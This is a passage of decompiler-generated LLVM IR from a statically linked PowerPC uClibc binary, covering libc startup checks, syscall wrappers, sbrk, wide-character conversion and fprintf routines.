dec_label_pc_10011918:                            ; preds = %dec_label_pc_10011908, %dec_label_pc_100118e0
  %v1_1001191c = call i32 @_dl_aux_init(i32 %v2_100118b4)
  store i32 %v1_1001191c, i32* @r3, align 4
  store i32 268507428, i32* @lr, align 4
  %v1_10011920 = call i32 @__GI___uClibc_init(i32 %v1_1001191c)
  %v3_10011928 = icmp eq i32 %tmp27, 0
  br i1 %v3_10011928, label %dec_label_pc_10011930, label %dec_label_pc_10011934

dec_label_pc_10011930:                            ; preds = %dec_label_pc_10011918
  br label %dec_label_pc_10011934

dec_label_pc_10011934:                            ; preds = %dec_label_pc_10011918, %dec_label_pc_10011930
  %v0_1001193c = phi i32 [ %tmp27, %dec_label_pc_10011918 ], [ 4096, %dec_label_pc_10011930 ]
  store i32 %v0_1001193c, i32* @global_var_1002abf8.640, align 4
  %v3_10011940 = icmp eq i32 %tmp26, -1
  br i1 %v3_10011940, label %dec_label_pc_10011948, label %dec_label_pc_1001197c

dec_label_pc_10011948:                            ; preds = %dec_label_pc_10011934
  store i32 268507468, i32* @lr, align 4
  %v1_10011948 = call i32 @getuid(i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  store i32 %v1_10011948, i32* %r29.global-to-local, align 4
  store i32 268507476, i32* @lr, align 4
  %v0_10011950 = call i32 @geteuid()
  %v4_10011954 = icmp eq i32 %v1_10011948, %v0_10011950
  br i1 %v4_10011954, label %dec_label_pc_1001195c, label %dec_label_pc_10011998

dec_label_pc_1001195c:                            ; preds = %dec_label_pc_10011948
  store i32 268507488, i32* @lr, align 4
  %v1_1001195c = call i32 @getgid(i32 %v0_10011950)
  store i32 %v1_1001195c, i32* %r29.global-to-local, align 4
  store i32 268507496, i32* @lr, align 4
  %v0_10011964 = call i32 @getegid()
  %v4_10011968 = icmp eq i32 %v1_1001195c, %v0_10011964
  br i1 %v4_10011968, label %dec_label_pc_10011970.thread, label %dec_label_pc_10011998

dec_label_pc_10011970.thread:                     ; preds = %dec_label_pc_1001195c
  br label %dec_label_pc_100119c8

dec_label_pc_1001197c:                            ; preds = %dec_label_pc_10011934
  %v4_10011980 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_10011980, label %dec_label_pc_10011988, label %dec_label_pc_10011998

dec_label_pc_10011988:                            ; preds = %dec_label_pc_1001197c
  br label %dec_label_pc_10011998

dec_label_pc_10011998:                            ; preds = %dec_label_pc_10011988, %dec_label_pc_1001197c, %dec_label_pc_1001195c, %dec_label_pc_10011948
  store i32 268507560, i32* @lr, align 4
  %v2_100119a4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268507576, i32* @lr, align 4
  %v2_100119b4 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268507592, i32* @lr, align 4
  %v2_100119c4 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_100119c8

dec_label_pc_100119c8:                            ; preds = %dec_label_pc_10011970.thread, %dec_label_pc_10011998
  %v0_100119d4 = load i32, i32* @r30, align 4
  %v1_100119d4 = inttoptr i32 %v0_100119d4 to i32*
  %v2_100119d4 = load i32, i32* %v1_100119d4, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_100119d4, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -21604) to i32*), align 4
  %v0_100119f4 = load i32, i32* @r27, align 4
  store i32 %v0_100119f4, i32* @global_var_1002abfc.663, align 4
  br i1 false, label %dec_label_pc_100119fc, label %dec_label_pc_10011a74

dec_label_pc_100119fc:                            ; preds = %dec_label_pc_100119c8, %dec_label_pc_100119fc
  br i1 undef, label %dec_label_pc_100119fc, label %dec_label_pc_10011a74

dec_label_pc_10011a74:                            ; preds = %dec_label_pc_100119fc, %dec_label_pc_100119c8
  %v0_10011a20 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_10011a20)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10011a84 = call i32 @__errno_location()
  %v2_10011a8c = inttoptr i32 %v0_10011a84 to i32*
  store i32 0, i32* %v2_10011a8c, align 4
  %v0_10011aa0 = call i32 @__GI___h_errno_location()
  %v2_10011aa8 = inttoptr i32 %v0_10011aa0 to i32*
  store i32 0, i32* %v2_10011aa8, align 4
  %v0_10011ab8 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_10011ab8)
  %v0_10011ac4 = call i32 @__GI_exit()
  ret i32 %v0_10011ac4

; uselistorder directives
  uselistorder i32 %v2_1001190c, { 1, 0 }
  uselistorder i32 %v1_10011908, { 2, 1, 0 }
  uselistorder i32 %v1_100118d4, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_100118b4, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 ()* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 14, { 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_100119fc, { 1, 0 }
  uselistorder label %dec_label_pc_100119c8, { 1, 0 }
  uselistorder label %dec_label_pc_10011934, { 1, 0 }
  uselistorder label %dec_label_pc_10011908, { 1, 0 }
  uselistorder label %dec_label_pc_100118e8, { 1, 0 }
  uselistorder label %dec_label_pc_100118b4, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_10011ad4 = load i32, i32* @r3, align 4
  store i32 %v0_10011ad4, i32* @r29, align 4
  %v0_10011adc = call i32 @__errno_location()
  %v0_10011ae0 = load i32, i32* @r29, align 4
  %v2_10011ae0 = inttoptr i32 %v0_10011adc to i32*
  store i32 %v0_10011ae0, i32* %v2_10011ae0, align 4
  ret i32 -1
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011b14 = call i32 @__asm_mfcr()
  %v1_10011b18 = and i32 %v0_10011b14, 268435456
  %v3_10011b18 = icmp eq i32 %v1_10011b18, 0
  store i32 %v0_10011b14, i32* %r31.global-to-local, align 4
  br i1 %v3_10011b18, label %dec_label_pc_10011b30, label %dec_label_pc_10011b24

dec_label_pc_10011b24:                            ; preds = %entry
  %v0_10011b24 = call i32 @__errno_location()
  %v0_10011b28 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011b28 = inttoptr i32 %v0_10011b24 to i32*
  store i32 %v0_10011b28, i32* %v2_10011b28, align 4
  br label %dec_label_pc_10011b30

dec_label_pc_10011b30:                            ; preds = %entry, %dec_label_pc_10011b24
  %v0_10011b40 = phi i32 [ %v0_10011b14, %entry ], [ -1, %dec_label_pc_10011b24 ]
  ret i32 %v0_10011b40

; uselistorder directives
  uselistorder label %dec_label_pc_10011b30, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011b5c = call i32 @__asm_mfcr()
  %v1_10011b60 = and i32 %v0_10011b5c, 268435456
  %v3_10011b60 = icmp eq i32 %v1_10011b60, 0
  store i32 %v0_10011b5c, i32* %r31.global-to-local, align 4
  br i1 %v3_10011b60, label %dec_label_pc_10011b78, label %dec_label_pc_10011b6c

dec_label_pc_10011b6c:                            ; preds = %entry
  %v0_10011b6c = call i32 @__errno_location()
  %v0_10011b70 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011b70 = inttoptr i32 %v0_10011b6c to i32*
  store i32 %v0_10011b70, i32* %v2_10011b70, align 4
  br label %dec_label_pc_10011b78

dec_label_pc_10011b78:                            ; preds = %entry, %dec_label_pc_10011b6c
  %v0_10011b88 = phi i32 [ %v0_10011b5c, %entry ], [ -1, %dec_label_pc_10011b6c ]
  ret i32 %v0_10011b88

; uselistorder directives
  uselistorder label %dec_label_pc_10011b78, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011ba4 = call i32 @__asm_mfcr()
  %v1_10011ba8 = and i32 %v0_10011ba4, 268435456
  %v3_10011ba8 = icmp eq i32 %v1_10011ba8, 0
  store i32 %v0_10011ba4, i32* %r31.global-to-local, align 4
  br i1 %v3_10011ba8, label %dec_label_pc_10011bc0, label %dec_label_pc_10011bb4

dec_label_pc_10011bb4:                            ; preds = %entry
  %v0_10011bb4 = call i32 @__errno_location()
  %v0_10011bb8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011bb8 = inttoptr i32 %v0_10011bb4 to i32*
  store i32 %v0_10011bb8, i32* %v2_10011bb8, align 4
  br label %dec_label_pc_10011bc0

dec_label_pc_10011bc0:                            ; preds = %entry, %dec_label_pc_10011bb4
  %v0_10011bd0 = phi i32 [ %v0_10011ba4, %entry ], [ -1, %dec_label_pc_10011bb4 ]
  ret i32 %v0_10011bd0

; uselistorder directives
  uselistorder label %dec_label_pc_10011bc0, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011bec = call i32 @__asm_mfcr()
  %v1_10011bf0 = and i32 %v0_10011bec, 268435456
  %v3_10011bf0 = icmp eq i32 %v1_10011bf0, 0
  store i32 %v0_10011bec, i32* %r31.global-to-local, align 4
  br i1 %v3_10011bf0, label %dec_label_pc_10011c08, label %dec_label_pc_10011bfc

dec_label_pc_10011bfc:                            ; preds = %entry
  %v0_10011bfc = call i32 @__errno_location()
  %v0_10011c00 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011c00 = inttoptr i32 %v0_10011bfc to i32*
  store i32 %v0_10011c00, i32* %v2_10011c00, align 4
  br label %dec_label_pc_10011c08

dec_label_pc_10011c08:                            ; preds = %entry, %dec_label_pc_10011bfc
  %v0_10011c18 = phi i32 [ %v0_10011bec, %entry ], [ -1, %dec_label_pc_10011bfc ]
  ret i32 %v0_10011c18

; uselistorder directives
  uselistorder label %dec_label_pc_10011c08, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011c34 = call i32 @__asm_mfcr()
  %v1_10011c38 = and i32 %v0_10011c34, 268435456
  %v3_10011c38 = icmp eq i32 %v1_10011c38, 0
  store i32 %v0_10011c34, i32* %r31.global-to-local, align 4
  br i1 %v3_10011c38, label %dec_label_pc_10011c50, label %dec_label_pc_10011c44

dec_label_pc_10011c44:                            ; preds = %entry
  %v0_10011c44 = call i32 @__errno_location()
  %v0_10011c48 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011c48 = inttoptr i32 %v0_10011c44 to i32*
  store i32 %v0_10011c48, i32* %v2_10011c48, align 4
  br label %dec_label_pc_10011c50

dec_label_pc_10011c50:                            ; preds = %entry, %dec_label_pc_10011c44
  %v0_10011c60 = phi i32 [ %v0_10011c34, %entry ], [ -1, %dec_label_pc_10011c44 ]
  ret i32 %v0_10011c60

; uselistorder directives
  uselistorder label %dec_label_pc_10011c50, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011c7c = call i32 @__asm_mfcr()
  %v1_10011c80 = and i32 %v0_10011c7c, 268435456
  %v3_10011c80 = icmp eq i32 %v1_10011c80, 0
  store i32 %v0_10011c7c, i32* %r31.global-to-local, align 4
  br i1 %v3_10011c80, label %dec_label_pc_10011c98, label %dec_label_pc_10011c8c

dec_label_pc_10011c8c:                            ; preds = %entry
  %v0_10011c8c = call i32 @__errno_location()
  %v0_10011c90 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011c90 = inttoptr i32 %v0_10011c8c to i32*
  store i32 %v0_10011c90, i32* %v2_10011c90, align 4
  br label %dec_label_pc_10011c98

dec_label_pc_10011c98:                            ; preds = %entry, %dec_label_pc_10011c8c
  %v0_10011ca8 = phi i32 [ %v0_10011c7c, %entry ], [ -1, %dec_label_pc_10011c8c ]
  ret i32 %v0_10011ca8

; uselistorder directives
  uselistorder label %dec_label_pc_10011c98, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_10011cc8 = load i32, i32* @global_var_1002ac28.670, align 4
  %v3_10011ccc = icmp eq i32 %v3_10011cc8, 0
  br i1 %v3_10011ccc, label %dec_label_pc_10011cd4, label %dec_label_pc_10011ce0

dec_label_pc_10011cd4:                            ; preds = %entry
  store i32 268508376, i32* @lr, align 4
  %v1_10011cd4 = call i32 @__GI_brk(i32 0)
  %v1_10011cd8 = icmp slt i32 %v1_10011cd4, 0
  br i1 %v1_10011cd8, label %dec_label_pc_10011d00, label %dec_label_pc_10011cd4.dec_label_pc_10011ce0_crit_edge

dec_label_pc_10011cd4.dec_label_pc_10011ce0_crit_edge: ; preds = %dec_label_pc_10011cd4
  %v0_10011ce0.pre = load i32, i32* @r30, align 4
  %v3_10011ce4.pre = load i32, i32* @global_var_1002ac28.670, align 4
  br label %dec_label_pc_10011ce0

dec_label_pc_10011ce0:                            ; preds = %dec_label_pc_10011cd4.dec_label_pc_10011ce0_crit_edge, %entry
  %v3_10011ce4 = phi i32 [ %v3_10011ce4.pre, %dec_label_pc_10011cd4.dec_label_pc_10011ce0_crit_edge ], [ %v3_10011cc8, %entry ]
  %v1_10011cec = phi i32 [ %v0_10011ce0.pre, %dec_label_pc_10011cd4.dec_label_pc_10011ce0_crit_edge ], [ %arg1, %entry ]
  %v3_10011ce0 = icmp eq i32 %v1_10011cec, 0
  store i32 %v3_10011ce4, i32* @r31, align 4
  br i1 %v3_10011ce0, label %dec_label_pc_10011d04, label %dec_label_pc_10011cf4

dec_label_pc_10011cf4:                            ; preds = %dec_label_pc_10011ce0
  %v2_10011cec = add i32 %v1_10011cec, %v3_10011ce4
  store i32 268508408, i32* @lr, align 4
  %v1_10011cf4 = call i32 @__GI_brk(i32 %v2_10011cec)
  %tmp6 = icmp sgt i32 %v1_10011cf4, -1
  br i1 %tmp6, label %dec_label_pc_10011cf4.dec_label_pc_10011d04_crit_edge, label %dec_label_pc_10011d00

dec_label_pc_10011cf4.dec_label_pc_10011d04_crit_edge: ; preds = %dec_label_pc_10011cf4
  %v0_10011d08.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011d04

dec_label_pc_10011d00:                            ; preds = %dec_label_pc_10011cf4, %dec_label_pc_10011cd4
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_10011d04

dec_label_pc_10011d04:                            ; preds = %dec_label_pc_10011cf4.dec_label_pc_10011d04_crit_edge, %dec_label_pc_10011ce0, %dec_label_pc_10011d00
  %v0_10011d08 = phi i32 [ %v0_10011d08.pre, %dec_label_pc_10011cf4.dec_label_pc_10011d04_crit_edge ], [ %v3_10011ce4, %dec_label_pc_10011ce0 ], [ -1, %dec_label_pc_10011d00 ]
  ret i32 %v0_10011d08

; uselistorder directives
  uselistorder i32 %v3_10011ce4, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_10011d04, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011d34 = call i32 @__asm_mfcr()
  %v1_10011d38 = and i32 %v0_10011d34, 268435456
  %v3_10011d38 = icmp eq i32 %v1_10011d38, 0
  store i32 %v0_10011d34, i32* %r31.global-to-local, align 4
  br i1 %v3_10011d38, label %dec_label_pc_10011d50, label %dec_label_pc_10011d44

dec_label_pc_10011d44:                            ; preds = %entry
  %v0_10011d44 = call i32 @__errno_location()
  %v0_10011d48 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011d48 = inttoptr i32 %v0_10011d44 to i32*
  store i32 %v0_10011d48, i32* %v2_10011d48, align 4
  br label %dec_label_pc_10011d50

dec_label_pc_10011d50:                            ; preds = %entry, %dec_label_pc_10011d44
  %v0_10011d60 = phi i32 [ %v0_10011d34, %entry ], [ -1, %dec_label_pc_10011d44 ]
  ret i32 %v0_10011d60

; uselistorder directives
  uselistorder label %dec_label_pc_10011d50, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1002ac0c.671 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10011d70 = icmp eq i32 %arg1, 0
  store i32 16, i32* @r6, align 4
  %v2_10011d8c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10011d8c, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_10011d70, label %dec_label_pc_10011d98, label %dec_label_pc_10011da0

dec_label_pc_10011d98:                            ; preds = %entry
  %v2_10011d98 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10011d98, i32* @r3, align 4
  br label %dec_label_pc_10011da0

dec_label_pc_10011da0:                            ; preds = %entry, %dec_label_pc_10011d98
  %v0_10011da4 = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_10011d98 ]
  %v2_10011da0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_10011da4, i32* %stack_var_-40, align 4
  store i32 %v2_10011da0, i32* %stack_var_-36, align 4
  store i32 268508592, i32* @lr, align 4
  %v0_10011dac = call i32 @__GI_wcsnrtombs()
  %v3_10011db0 = icmp eq i32 %v0_10011dac, 0
  br i1 %v3_10011db0, label %dec_label_pc_10011db8, label %dec_label_pc_10011dbc

dec_label_pc_10011db8:                            ; preds = %dec_label_pc_10011da0
  br label %dec_label_pc_10011dbc

dec_label_pc_10011dbc:                            ; preds = %dec_label_pc_10011da0, %dec_label_pc_10011db8
  %v0_10011dc8 = phi i32 [ %v0_10011dac, %dec_label_pc_10011da0 ], [ 1, %dec_label_pc_10011db8 ]
  ret i32 %v0_10011dc8

; uselistorder directives
  uselistorder label %dec_label_pc_10011dbc, { 1, 0 }
  uselistorder label %dec_label_pc_10011da0, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_10011dd0 = load i32, i32* @r5, align 4
  store i32 %v0_10011dd0, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_10011dd8 = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_10011dd8

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10011ddc = load i32, i32* @r3, align 4
  %v3_10011ddc = icmp eq i32 %v0_10011ddc, 0
  %v0_10011de0 = load i32, i32* @lr, align 4
  store i32 %v0_10011de0, i32* %r0.global-to-local, align 4
  br i1 %v3_10011ddc, label %dec_label_pc_10011e08, label %dec_label_pc_10011df0

dec_label_pc_10011df0:                            ; preds = %entry
  %v1_10011df0 = load i32, i32* @r4, align 4
  %v4_10011df0 = icmp eq i32 %v0_10011ddc, %v1_10011df0
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_10011df0, label %dec_label_pc_10011dfc, label %dec_label_pc_10011e34

dec_label_pc_10011dfc:                            ; preds = %dec_label_pc_10011df0
  %v2_10011e00 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10011e00, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10011e34

dec_label_pc_10011e08:                            ; preds = %entry
  %v2_10011e0011 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10011e0011, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_10011e34

dec_label_pc_10011e14:                            ; preds = %dec_label_pc_10011e74.dec_label_pc_10011e54_crit_edge, %dec_label_pc_10011e54.preheader
  %v0_10011e14 = call i32 @__errno_location()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_10011e20 = inttoptr i32 %v0_10011e14 to i32*
  store i32 84, i32* %v2_10011e20, align 4
  %v0_10011e98.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10011e94

dec_label_pc_10011e28:                            ; preds = %dec_label_pc_10011e64
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_10011e84.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10011e80

dec_label_pc_10011e34:                            ; preds = %dec_label_pc_10011dfc, %dec_label_pc_10011df0, %dec_label_pc_10011e08
  %v2_10011e647 = phi i32 [ %v2_10011e00, %dec_label_pc_10011dfc ], [ %v0_10011ddc, %dec_label_pc_10011df0 ], [ %v2_10011e0011, %dec_label_pc_10011e08 ]
  %v0_10011e34 = load i32, i32* @r5, align 4
  %v1_10011e34 = load i32, i32* @r6, align 4
  %v3_10011e34 = icmp ugt i32 %v0_10011e34, %v1_10011e34
  br i1 %v3_10011e34, label %dec_label_pc_10011e3c, label %dec_label_pc_10011e40

dec_label_pc_10011e3c:                            ; preds = %dec_label_pc_10011e34
  store i32 %v1_10011e34, i32* @r5, align 4
  br label %dec_label_pc_10011e40

dec_label_pc_10011e40:                            ; preds = %dec_label_pc_10011e34, %dec_label_pc_10011e3c
  %v0_10011e4c = phi i32 [ %v0_10011e34, %dec_label_pc_10011e34 ], [ %v1_10011e34, %dec_label_pc_10011e3c ]
  %v1_10011e40 = add i32 %v0_10011e4c, 1
  store i32 %v1_10011e40, i32* %r0.global-to-local, align 4
  %v0_10011e44 = load i32, i32* @r4, align 4
  %v1_10011e44 = inttoptr i32 %v0_10011e44 to i32*
  %v2_10011e44 = load i32, i32* %v1_10011e44, align 4
  store i32 %v2_10011e44, i32* %r11.global-to-local, align 4
  store i32 %v0_10011e4c, i32* %r9.global-to-local, align 4
  store i32 %v0_10011e4c, i32* %ctr.global-to-local, align 4
  %v2_10011e7c3 = icmp eq i32 %v0_10011e4c, 0
  br i1 %v2_10011e7c3, label %dec_label_pc_10011e80, label %dec_label_pc_10011e54.preheader

dec_label_pc_10011e54.preheader:                  ; preds = %dec_label_pc_10011e40
  %v1_10011e5416 = inttoptr i32 %v2_10011e44 to i32*
  %v2_10011e5417 = load i32, i32* %v1_10011e5416, align 4
  store i32 %v2_10011e5417, i32* %r0.global-to-local, align 4
  %v1_10011e5818 = add i32 %v2_10011e44, 4
  store i32 %v1_10011e5818, i32* %r11.global-to-local, align 4
  %v2_10011e5c20 = icmp ugt i32 %v2_10011e5417, 127
  br i1 %v2_10011e5c20, label %dec_label_pc_10011e14, label %dec_label_pc_10011e64.lr.ph

dec_label_pc_10011e64.lr.ph:                      ; preds = %dec_label_pc_10011e54.preheader
  %extract.t = trunc i32 %v2_10011e5417 to i8
  br label %dec_label_pc_10011e64

dec_label_pc_10011e64:                            ; preds = %dec_label_pc_10011e64.lr.ph, %dec_label_pc_10011e74.dec_label_pc_10011e54_crit_edge
  %v2_10011e5423.off0 = phi i8 [ %extract.t, %dec_label_pc_10011e64.lr.ph ], [ %extract.t24, %dec_label_pc_10011e74.dec_label_pc_10011e54_crit_edge ]
  %v2_10011e6422 = phi i32 [ %v2_10011e647, %dec_label_pc_10011e64.lr.ph ], [ %v2_10011e74, %dec_label_pc_10011e74.dec_label_pc_10011e54_crit_edge ]
  %v3_10011e64 = inttoptr i32 %v2_10011e6422 to i8*
  store i8 %v2_10011e5423.off0, i8* %v3_10011e64, align 1
  %v0_10011e68 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011e68 = urem i32 %v0_10011e68, 256
  store i32 %v1_10011e68, i32* %r0.global-to-local, align 4
  %v3_10011e6c = icmp eq i32 %v1_10011e68, 0
  br i1 %v3_10011e6c, label %dec_label_pc_10011e28, label %dec_label_pc_10011e74

dec_label_pc_10011e74:                            ; preds = %dec_label_pc_10011e64
  %v0_10011e74 = load i32, i32* @r3, align 4
  %v1_10011e74 = load i32, i32* %r10.global-to-local, align 4
  %v2_10011e74 = add i32 %v1_10011e74, %v0_10011e74
  store i32 %v2_10011e74, i32* @r3, align 4
  %v0_10011e78 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011e78 = add i32 %v0_10011e78, -1
  store i32 %v1_10011e78, i32* %r9.global-to-local, align 4
  %v0_10011e7c = load i32, i32* %ctr.global-to-local, align 4
  %v1_10011e7c = add i32 %v0_10011e7c, -1
  store i32 %v1_10011e7c, i32* %ctr.global-to-local, align 4
  %v2_10011e7c = icmp eq i32 %v1_10011e7c, 0
  br i1 %v2_10011e7c, label %dec_label_pc_10011e80, label %dec_label_pc_10011e74.dec_label_pc_10011e54_crit_edge

dec_label_pc_10011e74.dec_label_pc_10011e54_crit_edge: ; preds = %dec_label_pc_10011e74
  %v0_10011e54.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10011e54 = inttoptr i32 %v0_10011e54.pre to i32*
  %v2_10011e54 = load i32, i32* %v1_10011e54, align 4
  store i32 %v2_10011e54, i32* %r0.global-to-local, align 4
  %v1_10011e58 = add i32 %v0_10011e54.pre, 4
  store i32 %v1_10011e58, i32* %r11.global-to-local, align 4
  %v2_10011e5c = icmp ugt i32 %v2_10011e54, 127
  %extract.t24 = trunc i32 %v2_10011e54 to i8
  br i1 %v2_10011e5c, label %dec_label_pc_10011e14, label %dec_label_pc_10011e64

dec_label_pc_10011e80:                            ; preds = %dec_label_pc_10011e74, %dec_label_pc_10011e40, %dec_label_pc_10011e28
  %v0_10011e84 = phi i32 [ %v0_10011e84.pre, %dec_label_pc_10011e28 ], [ %v2_10011e647, %dec_label_pc_10011e40 ], [ %v2_10011e74, %dec_label_pc_10011e74 ]
  %v2_10011e80 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10011e80, i32* %r0.global-to-local, align 4
  %v4_10011e84 = icmp eq i32 %v0_10011e84, %v2_10011e80
  br i1 %v4_10011e84, label %dec_label_pc_10011e90, label %dec_label_pc_10011e8c

dec_label_pc_10011e8c:                            ; preds = %dec_label_pc_10011e80
  %v0_10011e8c = load i32, i32* %r11.global-to-local, align 4
  %v1_10011e8c = load i32, i32* @r4, align 4
  %v2_10011e8c = inttoptr i32 %v1_10011e8c to i32*
  store i32 %v0_10011e8c, i32* %v2_10011e8c, align 4
  br label %dec_label_pc_10011e90

dec_label_pc_10011e90:                            ; preds = %dec_label_pc_10011e80, %dec_label_pc_10011e8c
  %v0_10011e90 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011e90 = load i32, i32* @r5, align 4
  %v2_10011e90 = sub i32 %v1_10011e90, %v0_10011e90
  store i32 %v2_10011e90, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10011e94

dec_label_pc_10011e94:                            ; preds = %dec_label_pc_10011e14, %dec_label_pc_10011e90
  %v0_10011e98 = phi i32 [ %v0_10011e98.pre, %dec_label_pc_10011e14 ], [ %v2_10011e90, %dec_label_pc_10011e90 ]
  store i32 %v0_10011de0, i32* %r0.global-to-local, align 4
  ret i32 %v0_10011e98

; uselistorder directives
  uselistorder i32 %v1_10011e7c, { 1, 0 }
  uselistorder i32 %v2_10011e74, { 0, 2, 1 }
  uselistorder i32 %v1_10011e68, { 1, 0 }
  uselistorder i32 %v0_10011e4c, { 2, 3, 0, 1 }
  uselistorder i32 %v2_10011e647, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32 84, { 4, 6, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_10011e94, { 1, 0 }
  uselistorder label %dec_label_pc_10011e90, { 1, 0 }
  uselistorder label %dec_label_pc_10011e64, { 1, 0 }
  uselistorder label %dec_label_pc_10011e40, { 1, 0 }
  uselistorder label %dec_label_pc_10011e34, { 2, 0, 1 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v2_10011eb4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10011eb4, i32* @r5, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_10011f0c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10011f0c, i32* %stack_var_-96, align 4
  store i32 268508952, i32* @lr, align 4
  %v0_10011f14 = call i32 @__GI_vfprintf()
  ret i32 %v0_10011f14
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10011f28 = load i32, i32* @lr, align 4
  store i32 %v0_10011f28, i32* %r0.global-to-local, align 4
  %v0_10011f34 = load i32, i32* @r5, align 4
  store i32 %v0_10011f34, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
